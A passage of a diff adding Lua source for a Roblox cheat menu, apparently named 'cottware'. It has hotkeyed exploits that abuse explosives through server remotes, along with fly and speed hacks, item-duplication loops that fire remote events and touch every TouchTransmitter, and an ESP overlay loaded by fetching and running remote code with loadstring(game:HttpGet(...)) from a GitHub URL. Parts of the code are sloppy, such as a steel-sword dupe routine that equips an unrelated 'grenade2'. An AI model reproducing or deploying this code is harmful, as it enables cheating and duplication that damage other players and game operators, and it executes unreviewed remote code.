+                local function performDoubleJump()
+                    local character = LocalPlayer.Character
+                    local humanoid = character and character:FindFirstChildOfClass('Humanoid')
+                            if humanoid and not hasDoubleJumped then
+                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                wait()
+        
+                                for _,v in next,plr.Backpack:GetChildren() do
+                                    if v.Name == 'C4' and v:FindFirstChild'RemoteEvent' then
+                                        v.Parent = plr.Character
+                                        wait()
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                                        wait(0.1)
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                        v.RemoteEvent:FireServer(mouse.Hit.LookVector)
+                                        v.Parent = plr.Backpack
+                                    end
+                                end
+        
+                                wait(0.1)
+                                for _,v in next,plr.Backpack:GetChildren() do
+                                    if v.Name == 'Grenade' and v:FindFirstChild'RemoteEvent' then
+                                        v.Parent = plr.Character
+                                        wait()
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                                        wait(0.1)
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                        v:Activate()
+                                        v.Parent = plr.Backpack
+                                    end
+                                end
+
+                                wait(0.1)
+                                for _,v in next,plr.Backpack:GetChildren() do
+                                    if v.Name == 'Grenade 2' and v:FindFirstChild'RemoteEvent' then
+                                        v.Parent = plr.Character
+                                        wait()
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                                        wait(0.1)
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                        v:Activate()
+                                        v.Parent = plr.Backpack
+                                    end
+                                end
+                                hasDoubleJumped = true
+                            end
+                        end
+                performDoubleJump()
+            else
+                local Players = game:GetService("Players")
+                local UserInputService = game:GetService("UserInputService")
+                local LocalPlayer = Players.LocalPlayer
+                
+                local plrs = game:GetService'Players'
+                local plr = plrs.LocalPlayer
+                local mouse = plr:GetMouse()
+                
+                local hasDoubleJumped = false
+                
+                local function performDoubleJump()
+                    local character = LocalPlayer.Character
+                    local humanoid = character and character:FindFirstChildOfClass('Humanoid')
+                            if humanoid and not hasDoubleJumped then
+                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                wait()
+        
+                                for _,v in next,plr.Backpack:GetChildren() do
+                                    if v.Name == 'C4' and v:FindFirstChild'RemoteEvent' then
+                                        v.Parent = plr.Character
+                                        wait()
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                                        wait(0.1)
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                        v.RemoteEvent:FireServer(mouse.Hit.LookVector)
+                                        v.Parent = plr.Backpack
+                                    end
+                                end
+        
+                                wait(0.1)
+                                for _,v in next,plr.Backpack:GetChildren() do
+                                    if v.Name == 'Grenade' and v:FindFirstChild'RemoteEvent' then
+                                        v.Parent = plr.Character
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                                        wait(0.1)
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                        v:Activate()
+                                        v.Parent = plr.Backpack
+                                    end
+                                end
+
+                                wait(0.1)
+                                for _,v in next,plr.Backpack:GetChildren() do
+                                    if v.Name == 'Grenade 2' and v:FindFirstChild'RemoteEvent' then
+                                        v.Parent = plr.Character
+                                        wait()
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                                        wait(0.1)
+                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                                        v.RemoteEvent:FireServer(mouse.Hit.LookVector)
+                                        v.Parent = plr.Backpack
+                                    end
+                                end
+                                hasDoubleJumped = true
+                            end
+                        end
+                performDoubleJump()
+            end
+        end
+    end
+    UserInputService.InputBegan:Connect(onKeyPress)
+end)
+
+local CBind =
+
+Menu.Hotkey("Main", "Misc", "Fast Reset", CBind, function(New)
+    local UserInputService = game:GetService("UserInputService")
+    local toggleState = false
+    local Bind3 = New
+
+    local function onKeyPress(input, gameProcessed)
+        if gameProcessed then return end
+
+        if input.KeyCode == Bind3 then
+            toggleState = not toggleState
+            if toggleState then
+                local player = game.Players.LocalPlayer
+                local humanoid = game.Workspace[player.Name].Humanoid
+                humanoid.Health = 0
+            else
+                local player = game.Players.LocalPlayer
+                local humanoid = game.Workspace[player.Name].Humanoid
+                humanoid.Health = 0
+            end
+        end
+    end
+    UserInputService.InputBegan:Connect(onKeyPress)
+end)
+
+local QBind =
+
+Menu.Hotkey("Main", "Misc", "G2 Speed", Qbind, function(New)
+    local UserInputService = game:GetService("UserInputService")
+    local toggleState = false
+    local Bind4 = New
+
+    local function onKeyPress(input, gameProcessed)
+        if gameProcessed then return end
+
+        if input.KeyCode == Bind4 then
+            toggleState = not toggleState
+            if toggleState then
+                for _,v in next,plr.Backpack:GetChildren() do
+                    if v.Name == 'Grenade 2' and v:FindFirstChild'RemoteEvent' then
+                        v.Parent = plr.Character
+                        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
+                    end
+                end
+                wait(0.3)
+                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.One, false, game)
+                wait(0.4)
+                local Players = game:GetService("Players")
+                local UserInputService = game:GetService("UserInputService")
+
+                function GetCharacter()
+                    return workspace:FindFirstChild(Players.LocalPlayer.Name)
+                end
+
+                function TeleportBehindRightArm()
+                    local character = GetCharacter()
+                    if character then
+                        local tool = character:FindFirstChild("Grenade 2")
+                        local rightArm = character:FindFirstChild("Torso") or character:FindFirstChild("Torso")
+                        
+                        local backPosition = rightArm.Position - (character.HumanoidRootPart.CFrame.LookVector * 7)
+                        
+                        if tool then
+                            tool:MoveTo(backPosition)
+                        end
+                    end
+                end
+                TeleportBehindRightArm()
+            else
+                for _,v in next,plr.Backpack:GetChildren() do
+                    if v.Name == 'Grenade 2' and v:FindFirstChild'RemoteEvent' then
+                        v.Parent = plr.Character
+                        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
+                    end
+                end
+                wait(0.3)
+                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.One, false, game)
+                wait(0.4)
+                local Players = game:GetService("Players")
+                local UserInputService = game:GetService("UserInputService")
+
+                function GetCharacter()
+                    return workspace:FindFirstChild(Players.LocalPlayer.Name)
+                end
+
+                function TeleportBehindRightArm()
+                    local character = GetCharacter()
+                    if character then
+                        local tool = character:FindFirstChild("Grenade 2")
+                        local rightArm = character:FindFirstChild("Torso") or character:FindFirstChild("Torso")
+                        
+                        local backPosition = rightArm.Position - (character.HumanoidRootPart.CFrame.LookVector * 7)
+                        
+                        if tool then
+                            tool:MoveTo(backPosition)
+                        end
+                    end
+                end
+                TeleportBehindRightArm()
+            end
+        end
+    end
+    UserInputService.InputBegan:Connect(onKeyPress)
+end)
+
+Menu.Container("Main", "Hit-Detection", "Right")
+
+Menu.CheckBox("Main", "Hit-Detection", "Enable", false, function(a)
+    cottware["Hit Sound"].Enabled = a
+end)
+
+Menu.CheckBox("Main", "Hit-Detection", "HitLogs", false, function(a)
+    cottware["Hit Logs"].Enabled = a
+end)
+
+local hitSounds = {
+    Bell = "rbxassetid://6534947240",
+    Bubble = "rbxassetid://6534947588",
+    Pick = "rbxassetid://1347140027",
+    Pop = "rbxassetid://198598793",
+    Rust = "rbxassetid://1255040462",
+    Vine = "rbxassetid://5332680810",
+    Skeet = "rbxassetid://5633695679",
+    Neverlose = "rbxassetid://6534948092",
+    Minecraft = "rbxassetid://4018616850",
+    Crak = "rbxassetid://9119561046",
+    Gamesense = "rbxassetid://4817809188",
+    Slime = "rbxassetid://6916371803",
+    CsGo = "rbxassetid://6937353691",
+    Stone = "rbxassetid://3581383408",
+    Snow = "rbxassetid://6455527632",
+}
+
+local hitSoundsNames = {"Bell", "Bubble", "Pick", "Pop", "Rust", "Vine", "Skeet", "Neverlose", "Minecraft", "Crak", "Gamesense", "Slime", "CsGo", "Stone", "Snow"}
+
+Menu.ComboBox("Main", "Hit-Detection", "Sounds", "Select One", {"Bell", "Bubble", "Pick", "Pop", "Rust", "Vine", "Skeet", "Neverlose", "Minecraft", "Crak", "Gamesense", "Slime", "CsGo", "Stone", "Snow"}, function(a)
+    cottware["Hit Sound"]["Hit Sound"] = a
+end)
+
+Menu.Slider('Main', 'Hit-Detection', 'Volume', 1, 10, 1, '', 1, function(a)
+    cottware["Hit Sound"].Volume = a
+end)
+
+Menu.Container("Main", "Fly", "Left")
+
+local FBind2 =
+
+Menu.Hotkey("Main", "Fly", "Keybind", FBind2, function(New)
+    local UserInputService = game:GetService("UserInputService")
+    local toggleState = false
+    local Bind5 = New
+
+    local function onKeyPress(input, gameProcessed)
+        if gameProcessed then return end
+
+        if input.KeyCode == Bind5 then
+            toggleState = not toggleState
+            if toggleState then
+                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.KeypadEight, false, game)
+            else
+                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.KeypadEight, false, game)
+            end
+        end
+    end
+    UserInputService.InputBegan:Connect(onKeyPress)
+end)
+
+local flySpeed = 120
+local maxFlySpeed = 500
+
+Menu.Slider('Main', 'Fly', 'Speed', 1, maxFlySpeed, FlySpeed, '', 1, function(a)
+    flySpeed = a
+end)
+
+Menu.Button('Main', 'Fly', 'Load Fly', function()
+    local player = game.Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:WaitForChild("Humanoid")
+    local rootPart = character:WaitForChild("HumanoidRootPart")
+    local camera = game.Workspace.CurrentCamera
+    local userInputService = game:GetService("UserInputService")
+    local runService = game:GetService("RunService")
+    local ValueControl = false
+    local moveDirection = Vector3.new(0, 0, 0)
+    local sliderHeld = false
+    local flyVelocity, flyControl
+    local isConfirmDelete = false
+    
+    local function updateFlySpeed(x)
+        local relativePos = math.clamp((x - sliderAbsPos) / sliderWidth, 0, 1)
+        flySpeed = math.floor(relativePos * maxFlySpeed)
+    end
+
+    local function startFly()
+        humanoid.PlatformStand = true
+        flyVelocity = Instance.new("BodyVelocity")
+        flyVelocity.Velocity = Vector3.new(0, 0, 0)
+        flyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
+        flyVelocity.Parent = rootPart
+        flyControl = Instance.new("BodyGyro")
+        flyControl.CFrame = rootPart.CFrame
+        flyControl.MaxTorque = Vector3.new(100000, 100000, 100000)
+        flyControl.P = 10000
+        flyControl.Parent = rootPart
+    end
+    
+    local function stopFly()
+        if flyVelocity then flyVelocity:Destroy() end
+        if flyControl then flyControl:Destroy() end
+        humanoid.PlatformStand = false
+    end
+    
+    local function updateFly()
+            moveDirection = Vector3.new(0, 0, 0)
+            if userInputService:IsKeyDown(Enum.KeyCode.W) then
+                moveDirection = moveDirection + camera.CFrame.LookVector
+            end
+            if userInputService:IsKeyDown(Enum.KeyCode.S) then
+                moveDirection = moveDirection - camera.CFrame.LookVector
+            end
+            if userInputService:IsKeyDown(Enum.KeyCode.A) then
+                moveDirection = moveDirection - camera.CFrame.RightVector
+            end
+            if userInputService:IsKeyDown(Enum.KeyCode.D) then
+                moveDirection = moveDirection + camera.CFrame.RightVector
+            end
+            if userInputService:IsKeyDown(Enum.KeyCode.Space) then
+                moveDirection = moveDirection + Vector3.new(0, 1, 0)
+            end
+    
+            if moveDirection.Magnitude > 0 then
+                flyVelocity.Velocity = moveDirection.Unit * flySpeed
+            else
+                flyVelocity.Velocity = Vector3.new(0, 0, 0)
+            end
+    
+        flyControl.CFrame = CFrame.new(rootPart.Position, rootPart.Position + camera.CFrame.LookVector)
+    end
+    
+    runService.RenderStepped:Connect(function()
+        if ValueControl then
+            updateFly()
+        end
+    end)
+    
+    userInputService.InputBegan:Connect(function(input)
+        if input.KeyCode == Enum.KeyCode.KeypadEight then
+            if not isConfirmDelete then
+                ValueControl = not ValueControl
+                if ValueControl then
+                    startFly()
+                else
+                    stopFly()
+                end
+            end
+        end
+    end)
+
+    player.CharacterAdded:Connect(function(char)
+        character = char
+        humanoid = character:WaitForChild("Humanoid")
+        rootPart = character:WaitForChild("HumanoidRootPart")
+        ValueControl = false
+        if ValueControl then
+            startFly()
+        end
+    end)
+end)
+
+Menu.Container("Main", "CFrame", "Left")
+
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local cframeSpeed = 100
+
+getgenv().cframeEnabled = false
+
+local function cframe()
+    RunService.RenderStepped:Connect(function()
+        if not player.Character or not player.Character:FindFirstChildOfClass("Humanoid") then
+            return
+        end
+
+        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+        if getgenv().cframeEnabled and humanoid and humanoid.MoveDirection.Magnitude > 0 then
+            local moveDirection = humanoid.MoveDirection * cframeSpeed * RunService.RenderStepped:Wait()
+            player.Character:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame + moveDirection)
+        end
+    end)
+end
+
+local function onCharacterAdded(character)
+    character:WaitForChild("Humanoid")
+    cframe()
+end
+
+player.CharacterAdded:Connect(onCharacterAdded)
+
+if player.Character then
+    onCharacterAdded(player.Character)
+end
+
+CFBind = 
+
+Menu.Hotkey("Main", "CFrame", "Keybind", CFBind, function(New)
+    local UserInputService = game:GetService("UserInputService")
+    local toggleState = false
+    local Bind6 = New
+
+    local function onKeyPress(input, gameProcessed)
+        if gameProcessed then return end
+
+        if input.KeyCode == Bind6 then
+            toggleState = not toggleState
+            if toggleState then
+                getgenv().cframeEnabled = true
+            else
+                getgenv().cframeEnabled = false
+            end
+        end
+    end
+    UserInputService.InputBegan:Connect(onKeyPress)
+end)
+
+Menu.Slider('Main', 'CFrame', 'Speed', 1, 500, 20, '', 1, function(Value)
+    cframeSpeed = Value
+end)
+
+Menu.Container("Main", "Dupe's", "Left")
+
+Menu.Button('Main', "Dupe's", "Dupe Steel's", function()
+    Linotify:Notify("Dupping 4 Steel's, This Will Take A Seconds", 2.6)
+    Linotify:Notify("Note: Turn Off The Auto Select", 2.6)
+
+    function DupeDaggers()
+        local player = game.Players.LocalPlayer
+        local player = game.Players.LocalPlayer
+
+        local playerGui = player:FindFirstChild("PlayerGui")
+        if playerGui then
+            local menuScreen = playerGui:FindFirstChild("Menu Screen")
+            if menuScreen and menuScreen:IsA("ScreenGui") then
+                menuScreen.Enabled = false
+                if menuScreen:FindFirstChild("RemoteEvent") then
+                    menuScreen.RemoteEvent:FireServer("Holloween Dagger")
+                else
+                    warn("RemoteEvent not found in Menu Screen.")
+                end
+            else
+                warn("Menu Screen not found or is not a ScreenGui.")
+            end
+        else
+            warn("PlayerGui not found.")
+        end
+
+        local function performActionAfterSpawn()
+            wait()
+            if player.Character then
+                player.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-287, 108, -48)
+                wait(0.3)
+
+                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.Health = 0
+                    wait()
+        local player = game.Players.LocalPlayer
+
+        local Dagger = player.Backpack:FindFirstChild("Holloween Dagger")
+
+        if Dagger then
+            local humanoid = player.Character:FindFirstChild("Humanoid")
+
+            if humanoid then
+                humanoid:EquipTool(Dagger)
+            else
+                warn("Humanoid not found in player's character.")
+            end
+        else
+            warn("Dagger tool not found in player's backpack.")
+                end
+                    wait(0.1)
+                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
+                    wait(0.1)
+                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.One, false, game)
+                end
+            else
+                warn("Player or Humanoid not found.")
+            end
+        end
+
+        if player.Character then
+            performActionAfterSpawn()
+        else
+            player.CharacterAdded:Connect(performActionAfterSpawn)
+        end
+        game:GetService("RunService").Heartbeat:Wait()
+        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
+    end
+
+    DupeDaggers()
+
+    wait(6)
+
+    DupeDaggers()
+
+    wait(6)
+
+    DupeDaggers()
+
+    wait(6)
+
+    DupeDaggers()
+
+    wait(6)
+
+    local root = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("HumanoidRootPart") or game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BasePart")
+    wait(0.1)
+    local function touch(x)
+        x = x:FindFirstAncestorWhichIsA("BasePart")
+        if x and firetouchinterest then
+            if x.Name == "Button" then
+                return
+            end
+            
+            task.spawn(function()
+                firetouchinterest(x, root, 1)
+                wait()
+                firetouchinterest(x, root, 0)
+            end)
+            x.CFrame = root.CFrame
+        end
+    end
+
+    for _, descendant in ipairs(workspace:GetDescendants()) do
+        if descendant:IsA("TouchTransmitter") then
+            touch(descendant)
+        end
+    end
+end)
+
+Menu.Button('Main', "Dupe's", "Dupe Daggers's", function()
+    Linotify:Notify("Dupping 4 Dagger's, This Will Take A Seconds", 2.6)
+    Linotify:Notify("Note: Turn Off The Auto Select", 2.6)
+
+    function DupeSteel()
+        local player = game.Players.LocalPlayer
+        local player = game.Players.LocalPlayer
+
+        local playerGui = player:FindFirstChild("PlayerGui")
+        if playerGui then
+            local menuScreen = playerGui:FindFirstChild("Menu Screen")
+            if menuScreen and menuScreen:IsA("ScreenGui") then
+                menuScreen.Enabled = false
+                if menuScreen:FindFirstChild("RemoteEvent") then
+                    menuScreen.RemoteEvent:FireServer("Steel Sword")
+                else
+                    warn("RemoteEvent not found in Menu Screen.")
+                end
+            else
+                warn("Menu Screen not found or is not a ScreenGui.")
+            end
+        else
+            warn("PlayerGui not found.")
+        end
+
+        local function performActionAfterSpawn()
+            wait()
+            if player.Character then
+                player.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-287, 108, -48)
+                wait(0.3)
+
+                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.Health = 0
+                    wait()
+        local player = game.Players.LocalPlayer
+
+        local SteelSword = player.Backpack:FindFirstChild("Steel Sword")
+
+        if SteelSword then
+            local humanoid = player.Character:FindFirstChild("Humanoid")
+
+            if humanoid then
+                humanoid:EquipTool(grenade2)
+            else
+                warn("Humanoid not found in player's character.")
+            end
+        else
+            warn("Steel Sword tool not found in player's backpack.")
+                end
+                    wait(0.1)
+                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
+                    wait(0.1)
+                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.One, false, game)
+                end
+            else
+                warn("Player or Humanoid not found.")
+            end
+        end
+
+        if player.Character then
+            performActionAfterSpawn()
+        else
+            player.CharacterAdded:Connect(performActionAfterSpawn)
+        end
+        game:GetService("RunService").Heartbeat:Wait()
+        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
+    end
+
+    DupeSteel()
+
+    wait(6)
+
+    DupeSteel()
+
+    wait(6)
+
+    DupeSteel()
+
+    wait(6)
+
+    DupeSteel()
+
+    wait(6)
+
+    local root = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("HumanoidRootPart") or game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BasePart")
+    wait(0.1)
+    local function touch(x)
+        x = x:FindFirstAncestorWhichIsA("BasePart")
+        if x and firetouchinterest then
+            if x.Name == "Button" then
+                return
+            end
+            
+            task.spawn(function()
+                firetouchinterest(x, root, 1)
+                wait()
+                firetouchinterest(x, root, 0)
+            end)
+            x.CFrame = root.CFrame
+        end
+    end
+
+    for _, descendant in ipairs(workspace:GetDescendants()) do
+        if descendant:IsA("TouchTransmitter") then
+            touch(descendant)
+        end
+    end
+end)
+
+local MainTab = Menu.Tab("Visuals")
+
+local Sense = loadstring(game:HttpGet('https://raw.githubusercontent.com/ZlvXs/backups/refs/heads/main/realcap.lua'))()
+
+Sense.teamSettings.enemy.enabled = true
+Sense.teamSettings.enemy.box = true
+Sense.teamSettings.enemy.boxColor[1] = Color3.fromRGB(255,255,255)
+Sense.teamSettings.enemy.boxOutline = false
+
+Sense.teamSettings.enemy.boxFill = false
+Sense.teamSettings.enemy.boxFillColor[1] = Color3.fromRGB(0,0,0)
+
+Sense.teamSettings.enemy.healthBar = false
+Sense.teamSettings.enemy.healthyColor = Color3.fromRGB(180, 76, 232)
+Sense.teamSettings.enemy.healthBarOutline = true
+
+Sense.teamSettings.enemy.healthText = false
+Sense.teamSettings.enemy.healthTextColor[1] = Color3.fromRGB(255,255,255)
+Sense.teamSettings.enemy.healthTextOutline = true
+
+Sense.teamSettings.enemy.name = false
+Sense.teamSettings.enemy.nameColor[1] = Color3.fromRGB(255,255,255)
+
+Sense.teamSettings.enemy.distance = false
+Sense.teamSettings.enemy.distanceColor[1] = Color3.fromRGB(255,255,255)
+
+Sense.teamSettings.enemy.tracer = false
+Sense.teamSettings.enemy.tracerOrigin = "Bottom"
+Sense.teamSettings.enemy.tracerColor[1] = Color3.fromRGB(255,255,255)
+
+Sense.teamSettings.enemy.offScreenArrow = false
+Sense.teamSettings.enemy.offScreenArrowColor[1] = Color3.fromRGB(255,255,255)
+Sense.teamSettings.enemy.offScreenArrowSize = 15
+Sense.teamSettings.enemy.offScreenArrowRadius = 150
+
+Menu.Container("Visuals", "Esp", "Left")
+
+Menu.CheckBox("Visuals", "Esp", "Box", false, function(x)
+    if x then
+        Sense.Load()    
+    else
+        Sense.Unload()    
+    end
+end)
+
+Menu.ColorPicker("Visuals", "Esp", "Box Color", AccentColor, 0, function(color)
+    Sense.teamSettings.enemy.boxColor[1] = color
+end)
+
+Menu.CheckBox("Visuals", "Esp", "Box Outline", false, function(x)
+    Sense.teamSettings.enemy.boxOutline = x
+end)
+
+Menu.CheckBox("Visuals", "Esp", "Box Fill", false, function(x)
+    Sense.teamSettings.enemy.boxFill = x
+end)
+
+Menu.ColorPicker("Visuals", "Esp", "Box Fill Color", Color3.fromRGB(0,0,0), 0, function(color)
+    Sense.teamSettings.enemy.boxFillColor[1] = color
+end)
+
+Menu.CheckBox("Visuals", "Esp", "HealthBar", false, function(x)
+    Sense.teamSettings.enemy.healthBar = x
+end)
+
+Menu.ColorPicker("Visuals", "Esp", "HealthBar Color", AccentColor, 0, function(color)
+    Sense.teamSettings.enemy.healthyColor = color
+end)
+
+Menu.CheckBox("Visuals", "Esp", "Health Text", false, function(x)
+    Sense.teamSettings.enemy.healthText = x
+end)
+
+Menu.ColorPicker("Visuals", "Esp", "Health Text Color", Color3.fromRGB(255,255,255), 0, function(color)
+    Sense.teamSettings.enemy.healthTextColor[1] = color
+end)
+
+Menu.CheckBox("Visuals", "Esp", "Names", false, function(x)
+    Sense.teamSettings.enemy.name = x
+end)
+
+Menu.ColorPicker("Visuals", "Esp", "Names Color", Color3.fromRGB(255,255,255), 0, function(color)
+    Sense.teamSettings.enemy.nameColor[1] = color
+end)
+
+Menu.CheckBox("Visuals", "Esp", "Distance", false, function(x)
+    Sense.teamSettings.enemy.distance = x
+end)
+
+Menu.ColorPicker("Visuals", "Esp", "Distance Color", Color3.fromRGB(255,255,255), 0, function(color)
+    Sense.teamSettings.enemy.distanceColor[1] = color
+end)
+
+Menu.CheckBox("Visuals", "Esp", "Tracer", false, function(x)
+    Sense.teamSettings.enemy.tracer = x
+end)
+
+Menu.ColorPicker("Visuals", "Esp", "Tracer Color", AccentColor, 0, function(color)
+    Sense.teamSettings.enemy.tracerColor[1] = color
+end)
+
+Menu.CheckBox("Visuals", "Esp", "Arrows", false, function(x)
+    Sense.teamSettings.enemy.offScreenArrow = x
+end)
+
+Menu.ColorPicker("Visuals", "Esp", "Arrows Color", AccentColor, 0, function(color)
+    Sense.teamSettings.enemy.offScreenArrowColor[1] = color
+end)
+
+Menu.Slider('Visuals', 'Esp', 'Arrows Size', 1, 100, 15, '', 2, function(x)
+    Sense.teamSettings.enemy.offScreenArrowSize = x
+end)
+
+Menu.Slider('Visuals', 'Esp', 'Arrows Size', 1, 150, 150, '', 2, function(x)
+    Sense.teamSettings.enemy.offScreenArrowRadius = x
+end)
+
+Menu.Container("Visuals", "World Settings", "Right")
+
+local Skyboxes = {
+    ["Purple Nebula"] = {
+        ["SkyboxBk"] = "rbxassetid://159454299",
+        ["SkyboxDn"] = "rbxassetid://159454296",
+        ["SkyboxFt"] = "rbxassetid://159454293",
+        ["SkyboxLf"] = "rbxassetid://159454286",
+        ["SkyboxRt"] = "rbxassetid://159454300",
+        ["SkyboxUp"] = "rbxassetid://159454288"
+    },
+    ["Nebula"] = {
+        ["SkyboxBk"] = "rbxassetid://6277563515",
+        ["SkyboxDn"] = "rbxassetid://6277565742",
+        ["SkyboxFt"] = "rbxassetid://6277567481",
+        ["SkyboxLf"] = "rbxassetid://6277569562",
+        ["SkyboxRt"] = "rbxassetid://6277583250",
+        ["SkyboxUp"] = "rbxassetid://6277586065"
+    },
+    ["Night Sky"] = {
+        ["SkyboxBk"] = "rbxassetid://12064107",
+        ["SkyboxDn"] = "rbxassetid://12064152",
+        ["SkyboxFt"] = "rbxassetid://12064121",
+        ["SkyboxLf"] = "rbxassetid://12063984",
+        ["SkyboxRt"] = "rbxassetid://12064115",
+        ["SkyboxUp"] = "rbxassetid://12064131"
+    },
+    ["Pink Daylight"] = {
+        ["SkyboxBk"] = "rbxassetid://271042516",
+        ["SkyboxDn"] = "rbxassetid://271077243",
+        ["SkyboxFt"] = "rbxassetid://271042556",
+        ["SkyboxLf"] = "rbxassetid://271042310",
+        ["SkyboxRt"] = "rbxassetid://271042467",
+        ["SkyboxUp"] = "rbxassetid://271077958"
+    },
+    ["Morning Glow"] = {
+        ["SkyboxBk"] = "rbxassetid://1417494030",
+        ["SkyboxDn"] = "rbxassetid://1417494146",
+        ["SkyboxFt"] = "rbxassetid://1417494253",
+        ["SkyboxLf"] = "rbxassetid://1417494402",
+        ["SkyboxRt"] = "rbxassetid://1417494499",
+        ["SkyboxUp"] = "rbxassetid://1417494643"
+    },
+    ["Setting Sun"] = {
+        ["SkyboxBk"] = "rbxassetid://626460377",
+        ["SkyboxDn"] = "rbxassetid://626460216",
+        ["SkyboxFt"] = "rbxassetid://626460513",
+        ["SkyboxLf"] = "rbxassetid://626473032",
+        ["SkyboxRt"] = "rbxassetid://626458639",
+        ["SkyboxUp"] = "rbxassetid://626460625"
+    },
+    ["Fade Blue"] = {
+        ["SkyboxBk"] = "rbxassetid://153695414",
+        ["SkyboxDn"] = "rbxassetid://153695352",
+        ["SkyboxFt"] = "rbxassetid://153695452",
+        ["SkyboxLf"] = "rbxassetid://153695320",
+        ["SkyboxRt"] = "rbxassetid://153695383",
+        ["SkyboxUp"] = "rbxassetid://153695471"
+    },
+    ["Elegant Morning"] = {
+        ["SkyboxBk"] = "rbxassetid://153767241",
+        ["SkyboxDn"] = "rbxassetid://153767216",
+        ["SkyboxFt"] = "rbxassetid://153767266",
+        ["SkyboxLf"] = "rbxassetid://153767200",
+        ["SkyboxRt"] = "rbxassetid://153767231",
+        ["SkyboxUp"] = "rbxassetid://153767288"
+    },
+    ["Neptune"] = {
+        ["SkyboxBk"] = "rbxassetid://218955819",
+        ["SkyboxDn"] = "rbxassetid://218953419",
+        ["SkyboxFt"] = "rbxassetid://218954524",
+        ["SkyboxLf"] = "rbxassetid://218958493",
+        ["SkyboxRt"] = "rbxassetid://218957134",
+        ["SkyboxUp"] = "rbxassetid://218950090"
+    },
+    ["Aesthetic Night"] = {
+        ["SkyboxBk"] = "rbxassetid://1045964490",
+        ["SkyboxDn"] = "rbxassetid://1045964368",
+        ["SkyboxFt"] = "rbxassetid://1045964655",
+        ["SkyboxLf"] = "rbxassetid://1045964655",
+        ["SkyboxRt"] = "rbxassetid://1045964655",
+        ["SkyboxUp"] = "rbxassetid://1045962969"
+    },
+    ["Floppa"] = {
+        ["SkyboxBk"] = "rbxassetid://6787971998",
+        ["SkyboxDn"] = "rbxassetid://6787971998",
+        ["SkyboxFt"] = "rbxassetid://6787971998",
+        ["SkyboxLf"] = "rbxassetid://6787971998",
+        ["SkyboxRt"] = "rbxassetid://6787971998",
+        ["SkyboxUp"] = "rbxassetid://6787971998"
+    },
+    ["Kanye West"] = {
+        ["SkyboxBk"] = "rbxassetid://10639466116",
+        ["SkyboxDn"] = "rbxassetid://10639466116",
+        ["SkyboxFt"] = "rbxassetid://10639466116",
+        ["SkyboxLf"] = "rbxassetid://10639466116",
+        ["SkyboxRt"] = "rbxassetid://10639466116",
+        ["SkyboxUp"] = "rbxassetid://10639466116"
+    },
+    ["HL Last Coast"] = {
+        ["SkyboxBk"] = "rbxassetid://8982470493",
+        ["SkyboxDn"] = "rbxassetid://8982469840",
+        ["SkyboxFt"] = "rbxassetid://8982469496",
+        ["SkyboxLf"] = "rbxassetid://8982468913",
+        ["SkyboxRt"] = "rbxassetid://8982462149",
+        ["SkyboxUp"] = "rbxassetid://8982461833"
+    },
+    ["Purple And Blue"] = {
+        ["SkyboxBk"] = "rbxassetid://149397692",
+        ["SkyboxDn"] = "rbxassetid://149397686",
+        ["SkyboxFt"] = "rbxassetid://149397697",
+        ["SkyboxLf"] = "rbxassetid://149397684",
+        ["SkyboxRt"] = "rbxassetid://149397688",
+        ["SkyboxUp"] = "rbxassetid://149397702"
+    },
+    ["Twighlight"] = {
+        ["SkyboxBk"] = "rbxassetid://264908339",
+        ["SkyboxDn"] = "rbxassetid://264907909",
+        ["SkyboxFt"] = "rbxassetid://264909420",
+        ["SkyboxLf"] = "rbxassetid://264909758",
+        ["SkyboxRt"] = "rbxassetid://264908886",
+        ["SkyboxUp"] = "rbxassetid://264907379"
+    },
+    ["Faded Morning"] = {
+        ["SkyboxBk"] = "rbxassetid://600830446",
+        ["SkyboxDn"] = "rbxassetid://600831635",
+        ["SkyboxFt"] = "rbxassetid://600832720",
+        ["SkyboxLf"] = "rbxassetid://600886090",
+        ["SkyboxRt"] = "rbxassetid://600833862",
+        ["SkyboxUp"] = "rbxassetid://600835177"
+    },
+    ["Strong Red"] = {
